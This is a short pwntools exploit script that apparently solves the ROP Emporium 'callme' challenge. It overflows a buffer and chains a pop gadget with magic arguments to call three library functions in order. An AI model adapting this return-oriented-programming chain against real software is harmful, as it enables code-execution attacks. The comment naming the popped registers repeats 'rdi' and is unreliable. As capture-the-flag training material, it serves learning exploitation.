# Decompile the .so file to find out the function validation

from pwn import *

elf = context.binary = ELF('./callme', checksec=False,)
context.log_level = 'debug'

io = process()

pop3 = 0x40093c

payload = flat(
	b'A' * 40,
	pop3,
	0xdeadbeefdeadbeef, 
	0xcafebabecafebabe, 
	0xd00df00dd00df00d,
	elf.sym['callme_one'],
	pop3,
	0xdeadbeefdeadbeef, 
	0xcafebabecafebabe, 
	0xd00df00dd00df00d,
	elf.sym['callme_two'],
	pop3,
	0xdeadbeefdeadbeef, 
	0xcafebabecafebabe, 
	0xd00df00dd00df00d,
	elf.sym['callme_three'],

)

# Pop3 is basically has pop rdi, pop rdi and pop rdx in one go

io.sendline(payload)
io.interactive()